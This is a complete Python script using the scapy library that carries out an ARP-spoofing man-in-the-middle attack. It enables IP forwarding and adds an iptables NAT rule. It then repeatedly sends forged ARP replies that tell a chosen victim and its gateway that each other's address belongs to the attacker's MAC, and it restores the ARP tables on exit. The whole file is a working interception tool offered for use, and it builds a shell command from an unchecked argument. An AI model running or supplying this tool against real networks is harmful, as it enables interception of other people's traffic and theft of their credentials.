import sys
import os
import time
from scapy.all import ARP, Ether, srp, sendp, conf

def help_text():
    print("\nUsage: python arp_spoof_attack.py <interface> <victim IP> <gateway IP/Server IP>\n")
    sys.exit(1)

def enable_ip_forwarding():
    print("[INFO] Enabling IP forwarding...")
    try:
        with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
            f.write("1")
        print("[DEBUG] Kernel IP forwarding enabled.")
    except Exception as e:
        print(f"[ERROR] Failed to enable IP forwarding: {e}")

def disable_ip_forwarding():
    print("[INFO] Disabling IP forwarding...")
    try:
        with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
            f.write("0")
        print("[DEBUG] Kernel IP forwarding disabled.")
    except Exception as e:
        print(f"[ERROR] Failed to disable IP forwarding: {e}")

def setup_iptables():
    print("[INFO] Setting up iptables for NAT redirection on interface", interface)
    try:
        os.system("iptables -t nat -A POSTROUTING -o " + interface + " -j MASQUERADE")
        print("[DEBUG] iptables NAT rule added.")
    except Exception as e:
        print(f"[ERROR] Failed to set up iptables: {e}")

def flush_iptables():
    print("[INFO] Flushing iptables NAT rules...")
    try:
        os.system("iptables -t nat -F")
        print("[DEBUG] iptables NAT rules flushed.")
    except Exception as e:
        print(f"[ERROR] Failed to flush iptables rules: {e}")

def get_mac(ip):
    print(f"[DEBUG] Getting MAC address for {ip}...")
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = broadcast / arp_request
    answered_list = srp(packet, timeout=3, verbose=False)[0]
    if answered_list:
        mac = answered_list[0][1].hwsrc
        print(f"[DEBUG] Received MAC {mac} for IP {ip}")
        return mac
    else:
        print(f"[ERROR] No response for IP {ip}")
        return None

def spoof(target_ip, spoof_ip):
    """
    Send a spoofed ARP reply to target_ip, claiming that spoof_ip is at our MAC.
    """
    target_mac = get_mac(target_ip)
    if target_mac is None:
        print(f"[ERROR] Could not retrieve MAC for {target_ip}. Skipping spoof.")
        return
    packet = Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    print(f"[DEBUG] Sending spoofed ARP reply to {target_ip}: Claiming {spoof_ip} is at our MAC.")
    sendp(packet, verbose=False)

def restore(target_ip, real_ip):
    """
    Restore the ARP table of target_ip by setting the correct mapping for real_ip.
    """
    print(f"[INFO] Restoring ARP table for {target_ip}...")
    target_mac = get_mac(target_ip)
    real_mac = get_mac(real_ip)
    if target_mac is None or real_mac is None:
        print("[ERROR] Could not restore ARP entries due to missing MAC addresses.")
        return
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=real_ip, hwsrc=real_mac)
    sendp(packet, count=7, verbose=False)
    print(f"[INFO] ARP table restored for {target_ip}.")

def mitm():
    # Verify that we can get both MAC addresses
    victim_mac = get_mac(VICTIM_IP)
    if victim_mac is None:
        print("[ERROR] Could not obtain victim's MAC address. Exiting.")
        disable_ip_forwarding()
        flush_iptables()
        sys.exit(1)
    gateway_mac = get_mac(GATEWAY_IP)
    if gateway_mac is None:
        print("[ERROR] Could not obtain gateway's MAC address. Exiting.")
        disable_ip_forwarding()
        flush_iptables()
        sys.exit(1)
    print(f"[DEBUG] Victim MAC: {victim_mac} | Gateway MAC: {gateway_mac}")

    iteration = 0
    print("[INFO] Starting ARP spoofing. Press CTRL+C to stop and restore ARP tables.")
    try:
        while True:
            iteration += 1
            print(f"[DEBUG] Iteration {iteration}: Spoofing victim and gateway...")
            # Tell the victim that the gateway is at our MAC.
            spoof(VICTIM_IP, GATEWAY_IP)
            # Tell the gateway that the victim is at our MAC.
            spoof(GATEWAY_IP, VICTIM_IP)
            time.sleep(1.5)
    except KeyboardInterrupt:
        print("\n[INFO] CTRL+C detected! Restoring network configuration...")
        restore(VICTIM_IP, GATEWAY_IP)
        restore(GATEWAY_IP, VICTIM_IP)
        disable_ip_forwarding()
        flush_iptables()
        print("[INFO] Exiting...")

if __name__ == "__main__":
    if len(sys.argv) != 4:
        help_text()
    interface = sys.argv[1]
    VICTIM_IP = sys.argv[2]
    GATEWAY_IP = sys.argv[3]
    conf.iface = interface

    enable_ip_forwarding()
    setup_iptables()
    mitm()
